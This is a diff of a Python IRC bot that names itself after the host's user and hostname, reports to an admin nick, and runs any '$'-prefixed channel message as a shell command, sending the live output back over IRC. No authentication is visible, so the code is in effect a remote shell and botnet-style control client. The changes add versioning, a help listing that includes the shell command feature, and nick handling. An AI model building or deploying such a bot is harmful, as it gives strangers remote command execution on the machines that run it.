@@ -13,6 +13,8 @@ from subprocess import Popen, PIPE, STDOUT
 import time
 from time import strftime, sleep
 
+version = 0.3
+
 def log(prefix, content=''):
    try:
       for line in content.split('\n'):
@@ -20,7 +22,7 @@ def log(prefix, content=''):
    except:
       print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))
 
-log("[*] IRC BOT")
+log("[*] IRC BOT v%s" % version)
 
 ############ Variables
 
@@ -32,7 +34,18 @@ admin = 'thesquash'                                                # the nick of
 hostname = socket.gethostname()
 local_user = getpass.getuser()
 
-nick = 'thesquashbot'                                              # final format will be [username|hostname]rand, boy do i wish IRC allowed nicks with @ characters
+#nick = 'thesquashbot'                                              # final format will be [username|hostname]rand, boy do i wish IRC allowed nicks with @ characters
+nick = '[%s|%s]' % (local_user, hostname)
+
+helpmsg = 'Version: v%s\n\
+Available Commands: \n\
+ 1. !quit          #-- shutdown the bot \n\
+ 2. !reload        #-- reconnect to IRC \n\
+ 3. public         #-- generic keyword for testing\n\
+ 4. private        #-- generic keyword for testing\n\
+ 5. help           #-- display this message\n\
+ 6. $<command>     #-- run <command> in shell and capture live output\n\
+ 7. !cancel        #-- stop grabbing running command output\n' % version
 
 ############ IRC functions
 
@@ -68,16 +81,16 @@ def handler(signum, frame):
 def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
    log('[+] Sent Data:')
    if (len(msg) > 480) or (msg.find('\n') != -1):
+      log('[#] Starting multiline output.')
       msgs = line_split(msg, 480)
       total = len(msgs)
       for num, line in enumerate(msgs):
-         log('[#] Looping.')
-         log('[<]  PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))
+         log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
          irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))
          sleep(1)
-      log('[#] Finished.')  
+      log('[#] Finished multiline output.')  
    else:
-      log('[<]  PRIVMSG %s :%s\r\n' % (to, msg))
+      log('[<]    PRIVMSG %s :%s\r' % (to, msg))
       irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))
 
 def broadcast(msg):                                               # function to send a message to the main channel
@@ -123,7 +136,7 @@ def run(cmd, respond_method='priv'):
          log('[>]    ', data)
          if (data.find('!cancel') != -1):
             run = 0
-            retcode = "CANCELLED"
+            retcode = "Cancelled."
             respond("[X]: %s" % retcode)
             os.killpg(p.pid, signal.SIGTERM)
             break
@@ -154,15 +167,13 @@ def run(cmd, respond_method='priv'):
       log("\n")
 
 ############The beef of things
+if len(nick) > 15: nick = '[%s]' % (local_user[:13])
 last_ping = time.time()
 threshold = 5 * 60
 quit_status = False
 while not quit_status:
-
-   connected = 0
    timeout_count = 0
    last_data = data = ''
-
    log("[+] Connecting...")
    log("[<]    Nick:        ", nick)
    log("[<]    Server:      ", server+':'+str(port))
@@ -176,10 +187,10 @@ while not quit_status:
       irc.send ('NICK %s\r\n' % nick )
       irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
       irc.send ('JOIN %s\r\n' % channel)
-      irc.send ('PRIVMSG %s :Reporting for duty.\r\n' % admin)
-   except Exception as e:
+      irc.send ('PRIVMSG %s :Bot v%s Running.\r\n' % (admin, version))
+   except Exception as error:
       log('[*] Connection Failed: ')
-      log('[X]    ',e)
+      log('[X]    ',error)
       timeout_count = 50
       sleep(10)
 
@@ -207,25 +218,32 @@ while not quit_status:
 
       elif data.find('Nickname is already in use') != -1:
          nick += str(random.randint(1,200))
+         if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
          timeout_count = 50
 
-      elif scan('!quit') or privscan('quit'):                          # i suggest prefacing any commands in the main channel with ! so nobody gets hurt
+      elif scan('!quit') or privscan('quit'):
          privmsg('Quitting.')
          irc.send ( 'QUIT\r\n' )
          quit_status = True
 
-      elif scan('!reload') or privscan('reload'):                          # i suggest prefacing any commands in the main channel with ! so nobody gets hurt
+      elif scan('!reload') or privscan('reload'):
          privmsg('Reloading.')
          irc.send ( 'QUIT\r\n' )
          break
 
-      elif scan('public'):                                             # or you know, just screw my advice and do it your own way
+      elif scan('public'):
          broadcast('Registered public keyword.')
 
-      elif privscan('private'):                                        # private messages to the bot are obviously commands, so no need for the !
+      elif privscan('private'):
          privmsg('Registered private keyword.')
 
-      elif scan('$'):                                                  # more complex examples
+      elif privscan('help'):
+         privmsg(helpmsg)
+
+      elif scan('help'):
+         broadcast(helpmsg)
+
+      elif scan('$'):
          cmd = data.split("$")[1]
          run(cmd, 'pub')
 
